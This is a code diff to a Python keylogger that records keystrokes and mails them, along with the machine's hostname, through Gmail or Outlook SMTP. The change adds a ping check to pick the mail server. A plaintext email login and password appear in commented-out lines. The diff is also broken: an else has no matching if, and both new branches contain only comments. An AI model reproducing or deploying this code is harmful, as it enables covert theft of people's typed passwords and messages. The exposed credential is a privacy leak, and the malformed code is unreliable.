@@ -3,7 +3,7 @@ import logging
 import datetime
 import smtplib
 import platform
-#import urllib2
+import os
 
 global maildata
 global sendfreq
@@ -17,6 +17,11 @@ sent=False
 mins=-sendfreq
 word=''
 hostname=platform.node()
+
+
+    servercon='smtp.gmail.com'
+else:
+    servercon='smtp-mail.outlook.com'
 
 log_dir = ""
 
@@ -59,10 +64,16 @@ def on_press(key):
         mins=datetime.datetime.now().minute
         
         print('sending email')
-        #server = smtplib.SMTP('smtp.gmail.com', 587)
-        #server.starttls()
-        #server.login("band.mishaps@gmail.com", "Baobab7512")
-        #server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
+        if os.system("ping smtp.gmail.com")==0:
+            #server = smtplib.SMTP('smtp.gmail.com', 587)
+            #server.starttls()
+            #server.login("band.mishaps@gmail.com", "Baobab7512")
+            #server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
+        else:
+            #server = smtplib.SMTP('smtp.gmail.com', 587)
+            #server.starttls()
+            #server.login("band.mishaps@gmail.com", "Baobab7512")
+            #server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
         #server.quit()
         print('email sent')
         print(maildata)
